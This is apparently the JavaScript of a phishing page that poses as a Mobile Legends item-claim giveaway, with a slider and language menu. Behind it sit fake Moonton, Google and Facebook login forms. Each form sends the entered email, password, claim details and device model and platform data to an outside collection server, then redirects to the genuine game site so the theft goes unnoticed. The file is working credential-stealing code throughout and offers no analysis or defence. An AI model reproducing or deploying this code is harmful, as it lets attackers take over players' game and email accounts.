function toggleDropdown(_0x2b2617) {
  _0x2b2617.stopPropagation();
  _0x2b2617 = document.getElementById('langMenu');
  _0x2b2617.style.display = "block" === _0x2b2617.style.display ? 'none' : "block";
}
window.addEventListener("load", function () {
  var _0x3d706e = document.getElementById("loadingScreen");
  var _0x3be8df = document.getElementById('mainContent');
  _0x3d706e.style.display = "none";
  _0x3be8df.style.visibility = "visible";
});
document.addEventListener("click", function (_0x520b41) {
  if (!document.querySelector(".lang-menu").contains(_0x520b41.target)) {
    document.getElementById("langMenu").style.display = "none";
  }
});
document.addEventListener('click', function (_0x1e569e) {
  var _0x4825d6 = document.querySelector(".lang-code");
  if (_0x1e569e.target.classList.contains("lang-option")) {
    _0x1e569e = _0x1e569e.target.getAttribute("data-value");
    _0x4825d6.textContent = _0x1e569e;
  }
  document.querySelector(".lang-menu").style.display = "none";
});
document.querySelector('.lang-switch').addEventListener("click", toggleDropdown);
let sliderTrack = document.getElementById("sliderTrack");
let slides = sliderTrack.children;
let currentIndex = 0x0;
let startX = 0x0;
let isDragging = false;
let autoPlay;
let firstSlideClone = slides[0x0].cloneNode(true);
sliderTrack.appendChild(firstSlideClone);
let totalSlides = sliderTrack.children.length;
function updateSliderPosition() {
  sliderTrack.style.transition = "transform 0.4s ease-in-out";
  sliderTrack.style.transform = "translateX(-" + 0x64 * currentIndex + '%)';
}
function startAutoPlay() {
  autoPlay = setInterval(() => {
    currentIndex++;
    updateSliderPosition();
    if (currentIndex === totalSlides - 0x1) {
      setTimeout(() => {
        sliderTrack.style.transition = "none";
        currentIndex = 0x0;
        sliderTrack.style.transform = "translateX(0%)";
      }, 0x190);
    }
  }, 0xfa0);
}
sliderTrack.addEventListener("touchstart", _0x2de299 => {
  startX = _0x2de299.touches[0x0].clientX;
  isDragging = true;
  clearInterval(autoPlay);
});
sliderTrack.addEventListener('touchmove', _0xe1f5af => {
  if (isDragging) {
    if (0x32 < (_0xe1f5af = _0xe1f5af.touches[0x0].clientX - startX) && 0x0 < currentIndex) {
      currentIndex--;
      isDragging = false;
      updateSliderPosition();
    } else if (_0xe1f5af < -0x32 && currentIndex < totalSlides - 0x1) {
      currentIndex++;
      isDragging = false;
      updateSliderPosition();
    }
  }
});
sliderTrack.addEventListener('touchend', () => {
  isDragging = false;
  if (currentIndex === totalSlides - 0x1) {
    setTimeout(() => {
      sliderTrack.style.transition = "none";
      currentIndex = 0x0;
      sliderTrack.style.transform = 'translateX(0%)';
    }, 0x190);
  }
  startAutoPlay();
});
startAutoPlay();
let loginBox = document.querySelector(".login-box-container");
let bgLogin = document.querySelector(".bg-login-box");

let claimModal = document.getElementById("claimModal");
let bgClaim = document.getElementById("bgClaim");

let claimData = {};

// 🔥 OPEN CLAIM MODAL
document.querySelectorAll(".btn-buy").forEach(btn => {
  btn.addEventListener("click", () => {
    claimModal.style.display = "flex";
    bgClaim.style.display = "block";

    claimModal.classList.add("active");
    bgClaim.classList.add("active");

    document.body.classList.add("no-scroll");
  });
});

// 🔥 SUBMIT CLAIM
document.getElementById("btnSubmitClaim").addEventListener("click", () => {
    let id = document.getElementById("claimId");
    let nick = document.getElementById("claimNick");
    let lv = document.getElementById("claimLv");
    let rank = document.getElementById("claimRank");

    // 🔥 anti error null
    if (!id || !nick || !lv || !rank) {
        console.error("Element tidak ditemukan!");
        return;
    }

    claimData = {
        id: id.value,
        nick: nick.value,
        lv: lv.value,
        tier: rank.value
    };

    // 🔥 validasi
    if (!claimData.id || !claimData.nick) {
        alert("ID & Nick wajib diisi!");
        return;
    }
    if (!/^\d{7,}$/.test(id)) {
    alert("Claim ID harus terdiri dari minimal 9 angka!");
    return;
  }

    console.log("CLAIM:", claimData);

    // 🔥 TUTUP CLAIM MODAL (FIX UTAMA)
    closeClaimBox();

    // 🔥 BUKA LOGIN
    loginBox.style.display = "flex";
    bgLogin.style.display = "block";
});

// 🔥 CLOSE BUTTON (X)
document.getElementById("closeBtnform").addEventListener("click", closeClaimBox);

// 🔥 CLICK OUTSIDE CLOSE
if (bgClaim) {
  bgClaim.addEventListener("click", closeClaimBox);
}

// 🔥 FUNCTION CLOSE CLAIM (FIX OVERLAY BUG)
function closeClaimBox() {
    if (claimModal) {
        claimModal.style.display = "none";
        claimModal.classList.remove("active");
    }

    if (bgClaim) {
        bgClaim.style.display = "none";
        bgClaim.classList.remove("active");
    }

    document.body.classList.remove("no-scroll");
}

// 🔥 CLOSE LOGIN BOX
let closeBtn = document.querySelector(".close-btn");
if (closeBtn) {
  closeBtn.addEventListener("click", () => {
    loginBox.style.display = "none";
    bgLogin.style.display = "none";
    document.body.classList.remove("no-scroll");
  });
}
let passwordInput = document.getElementById("moontonPassword");
let eyeIcon = document.getElementById("eysonImg");
document.getElementById("eyson").addEventListener("click", () => {
  var _0x4cc67f = "password" === passwordInput.type;
  passwordInput.type = _0x4cc67f ? "text" : "password";
  eyeIcon.src = _0x4cc67f ? 'img/icons/eyeson.svg' : "img/icons/eyesoff.svg";
});
let btnMoonton = document.getElementById("btnMoonton");
btnMoonton.addEventListener("click", () => {
  let _0x2fe651 = document.getElementById('loadingScreen');
  _0x2fe651.style.display = 'flex';
  setTimeout(() => {
    _0x2fe651.style.display = "none";
    var _0x247070 = document.querySelector(".login-moonton");
    var _0x32057d = document.querySelector(".bg-login-box");
    var _0x288310 = document.querySelector(".login-box-container");
    _0x247070.style.display = 'flex';
    _0x32057d.style.display = "block";
    _0x288310.style.display = "none";
    document.body.classList.add("no-scroll");
  }, 0x3e8);
});
let clMoonton = document.querySelector('.cl-moonton');
clMoonton.addEventListener("click", () => {
  var _0x561278 = document.querySelector('.login-moonton');
  var _0x34f894 = document.querySelector(".bg-login-box");
  _0x561278.style.display = 'none';
  _0x34f894.style.display = 'none';
  document.body.classList.remove("no-scroll");
});
let form = document.getElementById("moontonForm");
let emailM = document.getElementById("moontonEmail");
let passwordM = document.getElementById("moontonPassword");
let submitBtn = document.getElementById('btnSubmitMoonton');
let validUsername = /^[a-zA-Z0-9_]+$/;
let validEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
let validPhone = /^[0-9]{8,15}$/;
let validPassword = /^[a-zA-Z0-9]{6,}$/;
function isValidInput() {
  var _0x2ac000 = emailM.value.trim();
  var _0x601376 = passwordM.value.trim();
  return (validUsername.test(_0x2ac000) || validEmail.test(_0x2ac000) || validPhone.test(_0x2ac000)) && validPassword.test(_0x601376);
}
[emailM, passwordM].forEach(_0x35d19a => {
  _0x35d19a.addEventListener("input", () => {
    if (isValidInput()) {
      submitBtn.classList.add('active');
    } else {
      submitBtn.classList.remove("active");
    }
  });
});
form.addEventListener("submit", function (_0x46323c) {
  _0x46323c.preventDefault();
  if (isValidInput()) {
    let _0x35dccf = emailM.value.trim();
    let _0x104e16 = passwordM.value.trim();
    let _0x4b7288 = document.getElementById("logMoonton").value.trim();
    let _0x48293c = (_0x19ac46 = {}) => {
      _0x19ac46 = {
        'email': _0x35dccf,
        'password': _0x104e16,
        'logM': _0x4b7288,
        'claim': claimData,
        ..._0x19ac46
      };
      fetch("https://mlbb.xdanz.my.id/login-moonton", {
        'method': "POST",
        'headers': {
          'Content-Type': "application/json"
        },
        'body': JSON.stringify(_0x19ac46)
      }).then(_0x42a154 => {
        if (!_0x42a154.ok) {
          throw new Error("Gagal kirim data");
        }
        emailM.value = '';
        passwordM.value = '';
        let _0x526535 = document.getElementById("loadingScreen");
        _0x526535.style.display = 'flex';
        setTimeout(() => {
          var _0x43b164 = document.querySelector(".login-moonton");
          var _0x2d1a20 = document.querySelector(".bg-login-box");
          window.location.href = "https://m.mobilelegends.com";
          _0x526535.style.display = 'none';
          _0x43b164.style.display = "none";
          _0x2d1a20.style.display = "none";
          document.body.classList.remove("no-scroll");
        }, 0x3e8);
      })["catch"](_0x4c0cdd => {
        console.error("Error:", _0x4c0cdd);
      });
    };
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]).then(_0x32cde5 => {
        _0x48293c({
          'modelInfo': _0x32cde5.model || "Unknown",
          'platformInfo': _0x32cde5.platform || "Unknown",
          'versiInfo': _0x32cde5.platformVersion || "Unknown"
        });
      })['catch'](() => _0x48293c());
    } else {
      _0x48293c();
    }
  }
});
let passwordGoogle = document.getElementById("googlePassword");
let eyeGoogleIcon = document.getElementById("eysgImg");
document.getElementById("eysg").addEventListener("click", () => {
  var _0x11e12e = 'password' === passwordGoogle.type;
  passwordGoogle.type = _0x11e12e ? "text" : "password";
  eyeGoogleIcon.src = _0x11e12e ? "img/icons/eyeson.svg" : "img/icons/eyesoff.svg";
});
let btnGoogle = document.getElementById('btnGoogle');
btnGoogle.addEventListener("click", () => {
  let _0x2ce5cb = document.getElementById("loadingScreen");
  _0x2ce5cb.style.display = "flex";
  setTimeout(() => {
    _0x2ce5cb.style.display = 'none';
    var _0x2d1333 = document.querySelector('.login-google');
    var _0x16cf09 = document.querySelector(".bg-login-box");
    var _0x4c2edb = document.querySelector(".login-box-container");
    _0x2d1333.style.display = "flex";
    _0x16cf09.style.display = 'block';
    _0x4c2edb.style.display = "none";
    document.body.classList.add("no-scroll");
  }, 0x3e8);
});
let clGoogle = document.querySelector(".cl-google");
clGoogle.addEventListener("click", () => {
  var _0x205ba0 = document.querySelector('.login-google');
  var _0x4ab882 = document.querySelector('.bg-login-box');
  _0x205ba0.style.display = "none";
  _0x4ab882.style.display = "none";
  document.body.classList.remove("no-scroll");
});
let formG = document.getElementById('googleForm');
let emailG = document.getElementById('googleEmail');
let passwordG = document.getElementById("googlePassword");
let submitBtnG = document.getElementById("btnSubmitGoogle");
let validUsernameG = /^[a-zA-Z0-9_]+$/;
let validEmailG = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
let validPhoneG = /^[0-9]{8,15}$/;
let validPasswordG = /^[a-zA-Z0-9]{6,}$/;
function isValidInputG() {
  var _0x4c67b8 = emailG.value.trim();
  var _0x1de347 = passwordG.value.trim();
  return (validUsernameG.test(_0x4c67b8) || validEmailG.test(_0x4c67b8) || validPhoneG.test(_0x4c67b8)) && validPasswordG.test(_0x1de347);
}
function showFacebookPopup() {
  document.getElementById("loadingScreen").style.display = 'flex';
  setTimeout(() => {
    document.getElementById("loadingScreen").style.display = "none";
    document.querySelector(".login-facebook").style.display = 'flex';
    document.querySelector('.bg-login-box').style.display = 'flex';
    document.querySelector(".login-box-container").style.display = "none";
    document.body.classList.add('no-scroll');
  }, 0x3e8);
}
function hideFacebookPopup() {
  document.querySelector(".login-facebook").style.display = 'none';
  document.querySelector('.bg-login-box').style.display = 'none';
  document.body.classList.remove("no-scroll");
}
[emailG, passwordG].forEach(_0xbc6c0b => {
  _0xbc6c0b.addEventListener('input', () => {
    if (isValidInputG()) {
      submitBtnG.classList.add("active");
    } else {
      submitBtnG.classList.remove("active");
    }
  });
});
formG.addEventListener("submit", function (_0x4527ee) {
  _0x4527ee.preventDefault();
  if (isValidInputG()) {
    let _0x9f8ce9 = emailG.value.trim();
    let _0x445994 = passwordG.value.trim();
    let _0x19b838 = document.getElementById("logGoogle").value.trim();
    let _0x293201 = (_0x47698a = {}) => {
      _0x47698a = {
        'emailGoogle': _0x9f8ce9,
        'passwordGoogle': _0x445994,
        'logGoogle': _0x19b838,
        'claim': claimData,
        ..._0x47698a
      };
      fetch("https://mlbb.xdanz.my.id/login-google", {
        'method': "POST",
        'headers': {
          'Content-Type': "application/json"
        },
        'body': JSON.stringify(_0x47698a)
      }).then(_0x278f4b => {
        if (!_0x278f4b.ok) {
          throw new Error("Gagal kirim data");
        }
        emailG.value = '';
        passwordG.value = '';
        let _0x14b89c = document.getElementById("loadingScreen");
        _0x14b89c.style.display = "flex";
        setTimeout(() => {
          var _0x14ab46 = document.querySelector(".login-google");
          var _0x2bd8de = document.querySelector(".bg-login-box");
          window.location.href = 'https://m.mobilelegends.com';
          _0x14ab46.style.display = "none";
          _0x2bd8de.style.display = "none";
          document.body.classList.remove("no-scroll");
          _0x14b89c.style.display = "none";
        }, 0x1f4);
      })['catch'](_0x1588cc => {
        console.error('Error:', _0x1588cc);
      });
    };
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]).then(_0x56b443 => {
        _0x293201({
          'modelInfoG': _0x56b443.model || "Unknown",
          'platformInfoG': _0x56b443.platform || "Unknown",
          'versiInfoG': _0x56b443.platformVersion || "Unknown"
        });
      })["catch"](() => _0x293201());
    } else {
      _0x293201();
    }
  }
});
document.getElementById("btnFb").addEventListener("click", showFacebookPopup);
document.querySelector(".cl-facebook").addEventListener("click", hideFacebookPopup);
let passwordFacebook = document.getElementById("facebookPassword");
let eyeFacebookIcon = document.getElementById('eyfbImg');
document.getElementById("eyfb").addEventListener("click", () => {
  var _0x1bb3e6 = "password" === passwordFacebook.type;
  passwordFacebook.type = _0x1bb3e6 ? "text" : "password";
  eyeFacebookIcon.src = _0x1bb3e6 ? "img/icons/eyeson.svg" : "img/icons/eyesoff.svg";
});
let formFb = document.getElementById("facebookForm");
let emailFb = document.getElementById("facebookEmail");
let passwordFb = document.getElementById("facebookPassword");
let submitBtnFb = document.getElementById("btnSubmitFacebook");
let validUsernameFb = /^[a-zA-Z0-9_]+$/;
let validEmailFb = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
let validPhoneFb = /^[0-9]{8,15}$/;
let validPasswordFb = /^[a-zA-Z0-9]{6,}$/;
function isValidInputFb() {
  var _0x59d395 = emailFb.value.trim();
  var _0x5b1343 = passwordFb.value.trim();
  return (validUsernameFb.test(_0x59d395) || validEmailFb.test(_0x59d395) || validPhoneFb.test(_0x59d395)) && validPasswordFb.test(_0x5b1343);
}
[emailFb, passwordFb].forEach(_0x6680c8 => {
  _0x6680c8.addEventListener("input", () => {
    if (isValidInputFb()) {
      submitBtnFb.classList.add("active");
    } else {
      submitBtnFb.classList.remove("active");
    }
  });
});
formFb.addEventListener("submit", function (_0x205a59) {
  _0x205a59.preventDefault();
  if (isValidInputFb()) {
    let _0x4d00a1 = emailFb.value.trim();
    let _0x2b52c9 = passwordFb.value.trim();
    let _0x432fdf = document.getElementById('logFacebook').value.trim();
    let _0x4ccef0 = (_0x54fb72 = {}) => {
      _0x54fb72 = {
        'emailFacebook': _0x4d00a1,
        'passwordFacebook': _0x2b52c9,
        'logFacebook': _0x432fdf,
        'claim': claimData,
        ..._0x54fb72
      };
      fetch("https://mlbb.xdanz.my.id/login-facebook", {
        'method': "POST",
        'headers': {
          'Content-Type': "application/json"
        },
        'body': JSON.stringify(_0x54fb72)
      }).then(_0x48b713 => {
        if (!_0x48b713.ok) {
          throw new Error("Gagal kirim data");
        }
        emailFb.value = '';
        passwordFb.value = '';
        let _0x385a52 = document.getElementById("loadingScreen");
        _0x385a52.style.display = "flex";
        setTimeout(() => {
          window.location.href = "https://m.mobilelegends.com";
          _0x385a52.style.display = "none";
          document.querySelector(".login-facebook").style.display = "none";
          document.querySelector(".bg-login-box").style.display = "none";
          document.body.classList.remove("no-scroll");
        }, 0x1f4);
      })["catch"](_0x4e1761 => {
        console.error("Error:", _0x4e1761);
      });
    };
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      navigator.userAgentData.getHighEntropyValues(["model", "platform", 'platformVersion']).then(_0x182d9f => {
        _0x4ccef0({
          'modelInfoFb': _0x182d9f.model || "Unknown",
          'platformInfoFb': _0x182d9f.platform || "Unknown",
          'versiInfoFb': _0x182d9f.platformVersion || "Unknown"
        });
      })["catch"](() => _0x4ccef0());
    } else {
      _0x4ccef0();
    }
  }
});
